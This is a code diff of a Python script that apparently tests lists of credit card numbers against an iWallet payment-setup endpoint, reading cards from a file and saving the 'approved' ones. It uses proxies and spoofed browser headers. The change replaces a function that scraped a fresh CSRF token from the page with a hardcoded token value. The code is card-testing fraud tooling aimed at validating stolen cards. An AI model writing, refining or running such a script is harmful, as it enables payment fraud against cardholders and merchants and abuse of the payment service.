@@ -3,33 +3,6 @@ import urllib.parse
 import os
 import uuid
 import random
-import re
-
-def fetch_csrf_token(proxy=None):
-    """Fetches a fresh CSRF token from the iWallet page."""
-    proxies = {"http": proxy, "https": proxy} if proxy else None
-    try:
-        r = requests.get(
-            'https://app.iwallet.com/p/a0a64c61-7dc1-4327-aca7-9ee129c156ae',
-            headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'},
-            proxies=proxies,
-            timeout=30
-        )
-        # Try cookie first
-        token = (r.cookies.get('CSRF-TOKEN') or r.cookies.get('csrf-token')
-                 or r.cookies.get('X-CSRF-Token') or r.headers.get('x-csrf-token'))
-        if not token:
-            match = re.search(r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\'](.*?)["\']', r.text)
-            if match:
-                token = match.group(1)
-        if token:
-            print("Got fresh CSRF token")
-            return token
-        print("Warning: Could not extract CSRF token")
-        return None
-    except Exception as e:
-        print(f"Error fetching CSRF token: {e}")
-        return None
 
 def read_cc_file(filename):
     cards = []
@@ -64,12 +37,6 @@ def save_approved_card(card_details):
         print(f"Error saving approved card: {e}")
 
 def get_setup_intent(proxy=None):
-    # Fetch a fresh CSRF token each time
-    csrf_token = fetch_csrf_token(proxy)
-    if not csrf_token:
-        print("Could not get CSRF token, aborting setup intent")
-        return None, None
-
     headers = {
         'accept': 'application/json, text/plain, */*',
         'accept-language': 'en-GB,en;q=0.9',
@@ -85,7 +52,7 @@ def get_setup_intent(proxy=None):
         'sec-fetch-site': 'same-origin',
         'sec-fetch-storage-access': 'none',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-        'x-csrf-token': csrf_token,
+        'x-csrf-token': 'qRPfCTzybNTiSLD/g8QYLxnRemoO/+LxZCWK8NpeGJ5Dti7pf+t6XuffupYXqN85ZLj+ovYC4qK7CpoeHTivLA==',
         'x-requested-with': 'XMLHttpRequest',
     }
 
